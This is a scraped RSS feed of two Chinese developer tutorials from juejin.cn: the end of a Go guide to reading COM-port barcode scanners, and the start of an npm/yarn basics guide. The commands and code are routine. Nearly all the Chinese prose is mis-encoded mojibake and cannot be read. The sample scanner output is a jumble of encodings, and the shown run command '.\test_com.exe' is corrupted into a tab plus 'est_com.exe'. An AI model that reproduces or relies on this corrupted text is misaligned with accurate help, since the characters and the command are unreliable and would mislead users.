class="hljs-number">0.10</span>mmï¿½ï¿½<span class="hljs-number">4.0</span>ï¿½ï¿½ZJZ1<span class="hljs-number">.15</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.05</span>mmï¿½ï¿½ZJZ2<span class="hljs-number">.23</span>ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.10</span>mmï¿½ï¿½<span class="hljs-number">80</span>ï¿½ï¿½<span class="hljs-number">80</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">0.98</span>ï¿½ï¿½<span class="hljs-number">0.25</span>ï¿½ï¿½<span class="hljs-number">0.05</span>+<span class="hljs-number">0.40</span>ï¿½ï¿½<span class="hljs-number">11</span>ï¿½ï¿½<span class="hljs-number">2</span>/<span class="hljs-number">5</span>ï¿½ï¿½<span class="hljs-number">2</span>ï¿½ï¿½<span class="hljs-number">11</span>ï¿½ï¿½<span class="hljs-number">2</span>/<span class="hljs-number">5</span>ï¿½ï¿½<span class="hljs-number">2</span>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<span class="hljs-number">03</span><span class="hljs-number">-1</span><span class="hljs-number">-149</span><span class="hljs-number">-029</span>ï¿½ï¿½ï¿½ï¿½ï¿½Ç¾ï¿½ï¿½ï¿½
before convert: <span class="hljs-number">380</span>
coding: GBK
æ‰«ç æ—¶é—´:<span class="hljs-number">2025</span><span class="hljs-number">-12</span><span class="hljs-number">-08</span> <span class="hljs-number">13</span>:<span class="hljs-number">28</span>:<span class="hljs-number">16.4129887</span> +<span class="hljs-number">0800</span> CST m=+<span class="hljs-number">114.672778601</span>
------------------------
ç æ–‡: D181â– <span class="hljs-number">67010</span>-ATâ– FD181<span class="hljs-number">-661</span><span class="hljs-number">-12</span>â– EM41â– FLRYâ– <span class="hljs-number">0.5</span>â– é»„ç»¿â– <span class="hljs-number">690</span>â– <span class="hljs-number">300</span>â– <span class="hljs-number">15574</span>â– CC64â– ä¸‹æ–™<span class="hljs-number">4</span>â– é«˜å¿—å¼ºâ– <span class="hljs-number">2016</span>/<span class="hljs-number">12</span>/<span class="hljs-number">21</span>â– å¤œç­â– <span class="hljs-number">50</span>â– â– â– â– <span class="hljs-number">20170102</span>â– åˆ†<span class="hljs-number">4</span>â– X-F4â– <span class="hljs-number">2016.11</span><span class="hljs-number">.10</span>â– é‚µå…µâ– <span class="hljs-number">3</span>â– <span class="hljs-number">968221</span><span class="hljs-number">-1</span>(TE)â– <span class="hljs-number">0.5</span>â– â– DJ628<span class="hljs-number">-4.8</span>Ã—<span class="hljs-number">0.8</span>A(ZJZ)â– <span class="hljs-number">0.5</span>â– â– <span class="hljs-number">3.5</span>â– TE0<span class="hljs-number">.85</span>â– Â±<span class="hljs-number">0.05</span>mmâ– TE1<span class="hljs-number">.54</span>â– Â±<span class="hljs-number">0.10</span>mmâ– <span class="hljs-number">4.0</span>â– ZJZ1<span class="hljs-number">.15</span>â– Â±<span class="hljs-number">0.05</span>mmâ– ZJZ2<span class="hljs-number">.23</span>â– Â±<span class="hljs-number">0.10</span>mmâ– <span class="hljs-number">80</span>â– <span class="hljs-number">80</span>â– â– â– <span class="hljs-number">0.98</span>Â±<span class="hljs-number">0.25</span>â– <span class="hljs-number">0.05</span>+<span class="hljs-number">0.40</span>â– <span class="hljs-number">11</span>Â±<span class="hljs-number">2</span>/<span class="hljs-number">5</span>Â±<span class="hljs-number">2</span>â– <span class="hljs-number">11</span>Â±<span class="hljs-number">2</span>/<span class="hljs-number">5</span>Â±<span class="hljs-number">2</span>â– â– â– <span class="hljs-number">03</span><span class="hljs-number">-1</span><span class="hljs-number">-149</span><span class="hljs-number">-029</span>â– â– éå†›è½¦
</code></pre>
<h3 data-id="heading-23">5. ä»£ç ä¼˜åŒ–ä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-24">5.1 èµ„æºç®¡ç†</h4>
<ul>
<li>ä½¿ç”¨<code>defer</code>è¯­å¥ç¡®ä¿èµ„æºåŠæ—¶é‡Šæ”¾</li>
<li>å¯¹WMIå¯¹è±¡æ“ä½œæ·»åŠ ç©ºå€¼æ£€æŸ¥ï¼Œé¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸</li>
<li>åœ¨å¾ªç¯ä¸­åŠæ—¶é‡Šæ”¾ä¸å†ä½¿ç”¨çš„å¯¹è±¡</li>
</ul>
<h4 data-id="heading-25">5.2 é”™è¯¯å¤„ç†</h4>
<ul>
<li>å®ç°äº†å®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶</li>
<li>å¯¹å¯èƒ½å¤±è´¥çš„æ“ä½œï¼ˆå¦‚ä¸²å£æ‰“å¼€ã€æ•°æ®è¯»å–ï¼‰è¿›è¡Œé”™è¯¯æ•è·å’Œå¤„ç†</li>
<li>æä¾›å‹å¥½çš„é”™è¯¯æç¤ºä¿¡æ¯</li>
</ul>
<h4 data-id="heading-26">5.3 å¹¶å‘å®‰å…¨</h4>
<ul>
<li>ä½¿ç”¨é€šé“å®ç°åç¨‹é—´çš„å®‰å…¨é€šä¿¡</li>
<li>é¿å…å…±äº«å˜é‡çš„ç›´æ¥è®¿é—®ï¼Œå‡å°‘ç«æ€æ¡ä»¶</li>
</ul>
<h4 data-id="heading-27">5.4 æ€§èƒ½ä¼˜åŒ–</h4>
<ul>
<li>ä½¿ç”¨ç¼“å†²åŒºæ‹¼æ¥æ•°æ®ï¼Œå‡å°‘å­—ç¬¦ä¸²æ“ä½œå¼€é”€</li>
<li>é‡‡ç”¨åç¨‹å¹¶å‘å¤„ç†ï¼Œæé«˜ç³»ç»Ÿå“åº”é€Ÿåº¦</li>
<li>å®ç°äº†é«˜æ•ˆçš„ç¼–ç æ£€æµ‹ç®—æ³•</li>
</ul>
<h3 data-id="heading-28">6. ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-29">6.1 ç¼–è¯‘ä¸è¿è¡Œ</h4>
<p>åœ¨é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">go build -o test_com.exe test_com.go
</code></pre>
<p>è¿è¡Œç¨‹åºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">.	est_com.exe
</code></pre>
<h4 data-id="heading-30">6.2 ç«¯å£å ç”¨å¤„ç†</h4>
<p>å¦‚æœé‡åˆ°ç«¯å£è¢«å ç”¨çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å’Œç»ˆæ­¢å ç”¨è¿›ç¨‹ï¼š</p>
<ol>
<li>
<p>æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µï¼š</p>
<pre><code class="hljs language-bash" lang="bash">netstat -aon|findstr <span class="hljs-string">"ç«¯å£å·"</span>
</code></pre>
</li>
<li>
<p>æŸ¥çœ‹å ç”¨ç«¯å£çš„è¿›ç¨‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">tasklist|findstr <span class="hljs-string">"è¿›ç¨‹ID"</span>
</code></pre>
</li>
<li>
<p>ç»ˆæ­¢å ç”¨è¿›ç¨‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">taskkill /f /t /im è¿›ç¨‹åç§°
</code></pre>
</li>
</ol>
<h3 data-id="heading-31">7. æ€»ç»“ä¸å±•æœ›</h3>
<p>æœ¬é¡¹ç›®æˆåŠŸå®ç°äº†åŸºäºGolangçš„COMæ‰«ç æªè‡ªåŠ¨åŠ è½½ä¸æ‰«ç è§£ç åŠŸèƒ½ï¼Œå…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ol>
<li><strong>è·¨å‹å·å…¼å®¹</strong>ï¼šæ”¯æŒå¤šç§ä¸åŒå‹å·çš„æ‰«ç æªè®¾å¤‡</li>
<li><strong>è‡ªåŠ¨é€‚é…</strong>ï¼šè‡ªåŠ¨è¯†åˆ«ç³»ç»Ÿä¸­çš„COMç«¯å£å’Œæ‰«ç æªè®¾å¤‡</li>
<li><strong>ç¼–ç çµæ´»</strong>ï¼šæ”¯æŒå¤šç§ç¼–ç æ ¼å¼çš„è‡ªåŠ¨æ£€æµ‹ä¸è½¬æ¢</li>
<li><strong>é«˜æ•ˆå¤„ç†</strong>ï¼šé‡‡ç”¨åç¨‹å®ç°å¹¶å‘æ•°æ®å¤„ç†ï¼Œæé«˜ç³»ç»Ÿæ€§èƒ½</li>
</ol>
<p>æœªæ¥å¯ä»¥è¿›ä¸€æ­¥æ‰©å±•çš„åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ”¯æŒæ›´å¤šç±»å‹çš„æ¡ç è§£ç ï¼ˆå¦‚äºŒç»´ç ã€RFIDç­‰ï¼‰</li>
<li>å®ç°å›¾å½¢åŒ–ç•Œé¢ï¼Œæ–¹ä¾¿ç”¨æˆ·æ“ä½œ</li>
<li>å¢åŠ æ•°æ®æŒä¹…åŒ–åŠŸèƒ½ï¼Œæ”¯æŒæ‰«ç è®°å½•çš„å­˜å‚¨å’ŒæŸ¥è¯¢</li>
<li>æ‰©å±•æ”¯æŒLinuxç­‰å…¶ä»–æ“ä½œç³»ç»Ÿ</li>
</ul>
<h3 data-id="heading-32">8. é™„å½•</h3>
<h4 data-id="heading-33">8.1 ä¸»è¦æ•°æ®ç»“æ„</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// æ‰«ç æ•°æ®ç»“æ„ä½“</span>
<span class="hljs-keyword">type</span> CodeData <span class="hljs-keyword">struct</span> {
    Xsxh <span class="hljs-type">string</span> <span class="hljs-string">`json:"xsxh"`</span>
    Tzsh <span class="hljs-type">string</span> <span class="hljs-string">`json:"tzsh"`</span>
    Xh   <span class="hljs-type">string</span> <span class="hljs-string">`json:"xh"`</span>
    Clgg <span class="hljs-type">string</span> <span class="hljs-string">`json:"clgg"`</span>
    Ys   <span class="hljs-type">string</span> <span class="hljs-string">`json:"ys"`</span>
    Scrq <span class="hljs-type">string</span> <span class="hljs-string">`json:"scrq"`</span>
    Bc   <span class="hljs-type">string</span> <span class="hljs-string">`json:"gc"`</span>
    Hddh <span class="hljs-type">string</span> <span class="hljs-string">`json:"hddh"`</span>
    Xsgx <span class="hljs-type">string</span> <span class="hljs-string">`json:"xsgx"`</span>
    Bz   <span class="hljs-type">string</span> <span class="hljs-string">`json:"gz"`</span>
    Dz1  <span class="hljs-type">string</span> <span class="hljs-string">`json:"dz1"`</span>
    Ys1  <span class="hljs-type">string</span> <span class="hljs-string">`json:"ys1"`</span>
    Dz2  <span class="hljs-type">string</span> <span class="hljs-string">`json:"dz2"`</span>
    Ys2  <span class="hljs-type">string</span> <span class="hljs-string">`json:"ys2"`</span>
    Cpfl <span class="hljs-type">string</span> <span class="hljs-string">`json:"cpfl"`</span>
}
</code></pre>
<h4 data-id="heading-34">8.2 å…³é”®å¸¸é‡å®šä¹‰</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">const</span> (
    GBK     <span class="hljs-type">string</span> = <span class="hljs-string">"GBK"</span>
    UTF8    <span class="hljs-type">string</span> = <span class="hljs-string">"UTF8"</span>
    UNKNOWN <span class="hljs-type">string</span> = <span class="hljs-string">"UNKNOWN"</span>
)
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šnpmå’ŒyarnåŸºç¡€ä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7580971667037536282</link>    <guid>https://juejin.cn/post/7580971667037536282</guid>    <pubDate>2025-12-08T06:11:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580971667037536282" data-draft-id="7580971667037519898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šnpmå’ŒyarnåŸºç¡€ä½¿ç”¨"/> <meta itemprop="keywords" content="åç«¯,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-08T06:11:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šnpmå’ŒyarnåŸºç¡€ä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:11:04.000Z" title="Mon Dec 08 2025 06:11:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨ Node.js é¡¹ç›®å¼€å‘ä¸­ï¼ŒåŒ…ç®¡ç†å·¥å…·æ˜¯ä¸å¯æˆ–ç¼ºçš„åŸºç¡€è®¾æ–½ã€‚æ— è®ºä½ æ˜¯åœ¨æ­å»ºåç«¯æœåŠ¡å™¨ã€æ„å»ºå‰ç«¯å·¥ç¨‹ï¼Œè¿˜æ˜¯åˆ›å»ºå‘½ä»¤è¡Œå·¥å…·ï¼Œéƒ½éœ€è¦ä¾èµ–æˆåƒä¸Šä¸‡çš„ç¬¬ä¸‰æ–¹åŒ…ã€‚å› æ­¤ï¼Œç†è§£ npm ä¸ yarn çš„ä½¿ç”¨æ–¹æ³•ï¼Œå¯¹äºæå‡å¼€å‘æ•ˆç‡ã€ä¿è¯é¡¹ç›®å¯ç»´æŠ¤æ€§è‡³å…³é‡è¦ã€‚</p>
</blockquote>
<p>æœ¬ç¯‡æ–‡ç« å°†å¸¦ä½ å¿«é€ŸæŒæ¡ npm ä¸ yarn çš„æ ¸å¿ƒæ¦‚å¿µã€åŸºæœ¬å‘½ä»¤ä»¥åŠæ—¥å¸¸å¼€å‘ä¸­æœ€å¸¸ç”¨çš„æŠ€å·§ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯åŒ…ç®¡ç†å·¥å…·ï¼Ÿ</h2>
<p>å½“ä½ å¼€å§‹ä¸€ä¸ª Node.js é¡¹ç›®æ—¶ï¼Œä¼šä½¿ç”¨å„ç§ç¬¬ä¸‰æ–¹åº“ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>Expressï¼ˆæ­å»º Web æœåŠ¡ï¼‰</li>
<li>axiosï¼ˆè¯·æ±‚ HTTP æ¥å£ï¼‰</li>
<li>lodashï¼ˆå·¥å…·æ–¹æ³•åº“ï¼‰</li>
<li>moment / dayjsï¼ˆæ—¶é—´å¤„ç†ï¼‰</li>
</ul>
<p>è¿™äº›ä¾èµ–åŒ…ç”± npm æˆ– yarn æ¥å®Œæˆï¼š</p>
<ul>
<li>ä¸‹è½½ä¸ç®¡ç†ä¾èµ–</li>
<li>ç®¡ç†ç‰ˆæœ¬å·</li>
<li>é…ç½®é¡¹ç›®è„šæœ¬</li>
<li>å‘å¸ƒè‡ªå®šä¹‰æ¨¡å—</li>
</ul>
<p>ç®€è€Œè¨€ä¹‹ï¼ŒåŒ…ç®¡ç†å·¥å…·å°±æ˜¯é¡¹ç›®ä¾èµ–çš„â€œä»“åº“ç®¡ç†å‘˜â€ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€npmï¼šNode.js è‡ªå¸¦çš„åŒ…ç®¡ç†å™¨</h2>
<p>npm å…¨ç§° Node Package Managerï¼Œæ˜¯ Node.js å®‰è£…åŒ…ä¸­è‡ªå¸¦çš„å·¥å…·ï¼Œç”Ÿæ€æœ€ä¸ºåºå¤§ã€‚</p>
<h3 data-id="heading-2">npm å¸¸ç”¨å‘½ä»¤</h3>
<h4 data-id="heading-3">1. æŸ¥çœ‹ç‰ˆæœ¬</h4>
<pre><code class="hljs language-bash" lang="bash">npm -v
</code></pre>
<h4 data-id="heading-4">2. åˆå§‹åŒ–é¡¹ç›®</h4>
<p>ç”Ÿæˆ package.jsonï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm init -y
</code></pre>
<h4 data-id="heading-5">3. å®‰è£…ä¾èµ–</h4>
<p>å®‰è£…åˆ° dependenciesï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install express
</code></pre>
<p>å®‰è£…åˆ° devDependenciesï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install nodemon --save-dev
</code></pre>
<h4 data-id="heading-6">4. å…¨å±€å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash">npm install -g typescript
</code></pre>
<h4 data-id="heading-7">5. åˆ é™¤ä¾èµ–</h4>
<pre><code class="hljs language-bash" lang="bash">npm uninstall express
</code></pre>
<h4 data-id="heading-8">6. æ¸…ç†ç¼“å­˜</h4>
<pre><code class="hljs language-bash" lang="bash">npm cache clean --force
</code></pre>
<p>npm ä½¿ç”¨ç®€å•ç›´æ¥ï¼Œé€‚åˆå…¥é—¨ä¸”æ›´åŠ å®˜æ–¹ã€‚</p>
<hr/>
<h2 data-id="heading-9">ä¸‰ã€ä¸ºä»€ä¹ˆå‡ºç° yarnï¼Ÿ</h2>
<p>npm åœ¨æ—©æœŸå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li>å®‰è£…é€Ÿåº¦æ…¢</li>
<li>é”æ–‡ä»¶ä¸ç¨³å®š</li>
<li>å®‰è£…ç»“æœä¸å¯å¤ç°</li>
</ul>
<p>ä¸ºäº†è§£å†³è¿™äº›ç—›ç‚¹ï¼ŒFacebook æ¨å‡ºäº† yarnï¼Œå®ƒæä¾›äº†æ›´å¿«ã€æ›´ç¨³å®šçš„å®‰è£…ä½“éªŒã€‚</p>
<p>å¦‚ä»Š npm ç»è¿‡å¤šæ¬¡å‡çº§æ€§èƒ½å·²ç»æå‡è®¸å¤šï¼Œä½† yarn ä»æ‹¥æœ‰å¤§é‡ç”¨æˆ·ã€‚</p>
<hr/>
<h2 data-id="heading-10">å››ã€yarn çš„å¸¸ç”¨å‘½ä»¤</h2>
<p>æŸ¥çœ‹ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn -v
</code></pre>
<p>åˆå§‹åŒ–é¡¹ç›®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn init -y
</code></pre>
<p>å®‰è£…ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn add express
</code></pre>
<p>å®‰è£…å¼€å‘ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn add nodemon -D
</code></pre>
<p>åˆ é™¤ä¾èµ–ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn remove express
</code></pre>
<p>å…¨å±€å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn global add typescript
</code></pre>
<p>æŸ¥çœ‹å·²å®‰è£…åŒ…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn list
</code></pre>
<p>ç›¸æ¯” npmï¼Œyarn çš„è¾“å‡ºä¿¡æ¯æ›´ç®€æ´ï¼Œé€Ÿåº¦ä¹Ÿæ›´å¿«ã€‚</p>
<hr/>
<h2 data-id="heading-11">äº”ã€npm ä¸ yarn å‘½ä»¤å¯¹ç…§è¡¨</h2>













































<table><thead><tr><th>åŠŸèƒ½</th><th>npm</th><th>yarn</th></tr></thead><tbody><tr><td>åˆå§‹åŒ–é¡¹ç›®</td><td>npm init -y</td><td>yarn init -y</td></tr><tr><td>å®‰è£…é¡¹ç›®ä¾èµ–</td><td>npm install</td><td>yarn</td></tr><tr><td>å®‰è£…åŒ…</td><td>npm install xxx</td><td>yarn add xxx</td></tr><tr><td>å®‰è£…å¼€å‘ä¾èµ–</td><td>npm install xxx -D</td><td>yarn add xxx -D</td></tr><tr><td>åˆ é™¤åŒ…</td><td>npm uninstall xxx</td><td>yarn remove xxx</td></tr><tr><td>å…¨å±€å®‰è£…</td><td>npm install -g xxx</td><td>yarn global add xxx</td></tr><tr><td>è¿è¡Œè„šæœ¬</td><td>npm run start</td><td>yarn start</td></tr></tbody></table>
<p>ä½ å¯ä»¥çœ‹åˆ° yarn çš„å‘½ä»¤æ›´ç®€çŸ­ã€‚</p>
<hr/>
<h2 data-id="heading-12">å…­ã€package.jsonï¼šnpm ä¸ yarn çš„æ ¸å¿ƒæ–‡ä»¶</h2>
<p>æ— è®ºä½ ä½¿ç”¨ npm è¿˜æ˜¯ yarnï¼Œpackage.json éƒ½æ‰®æ¼”ç€ä¸­å¿ƒè§’è‰²ã€‚å®ƒè®°å½•ï¼š</p>
<ul>
<li>é¡¹ç›®åç§°ä¸ç‰ˆæœ¬</li>
<li>ä¾èµ–åˆ—è¡¨</li>
<li>å¼€å‘ä¾èµ–</li>
<li>æ‰§è¡Œè„šæœ¬</li>
<li>æ˜¯å¦ä¸º ES Module</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node-demo"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node index.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ—¥å¸¸å¼€å‘ä¸­ï¼Œä½ ç»å¸¸ä¼šå‘ scripts ä¸­æ·»åŠ æµ‹è¯•ã€æ„å»ºã€å¼€å‘å‘½ä»¤ã€‚</p>
<hr/>
<h2 data-id="heading-13">ä¸ƒã€package-lock.json ä¸ yarn.lock çš„ä½œç”¨</h2>
<p>ä¸ºäº†ç¡®ä¿é¡¹ç›®åœ¨ä»»ä½•æ—¶é—´ã€ä»»ä½•æœºå™¨ä¸Šå®‰è£…çš„ä¾èµ–ç‰ˆæœ¬ä¸€è‡´ï¼ŒåŒ…ç®¡ç†å™¨ä¼šç”Ÿæˆé”æ–‡ä»¶ã€‚</p>
<ul>
<li>npm ä½¿ç”¨ <strong>package-lock.json</strong></li>
<li>yarn ä½¿ç”¨ <strong>yarn.lock</strong></li>
</ul>
<p>é”æ–‡ä»¶å¯ä»¥é¿å…â€œä»Šå¤©èƒ½è¿è¡Œï¼Œæ˜å¤©ä¾èµ–ç‰ˆæœ¬å˜äº†å°±å´©äº†â€çš„æƒ…å†µã€‚</p>
<p>é”æ–‡ä»¶æ˜¯å¿…é¡»æäº¤åˆ°ä»£ç ä»“åº“çš„ã€‚</p>
<hr/>
<h2 data-id="heading-14">å…«ã€npm ä¸ yarn åº”è¯¥æ€ä¹ˆé€‰ï¼Ÿ</h2>
<h3 data-id="heading-15">é€‚åˆä½¿ç”¨ npm çš„æƒ…å†µ</h3>
<ul>
<li>çº¯ Node.js åç«¯é¡¹ç›®</li>
<li>å¸Œæœ›ä¿æŒå®˜æ–¹å·¥å…·é“¾</li>
<li>éœ€è¦è¾ƒå°‘çš„é¢å¤–é…ç½®</li>
<li>å›¢é˜Ÿä¸è¿½æ±‚æè‡´æ€§èƒ½</li>
</ul>
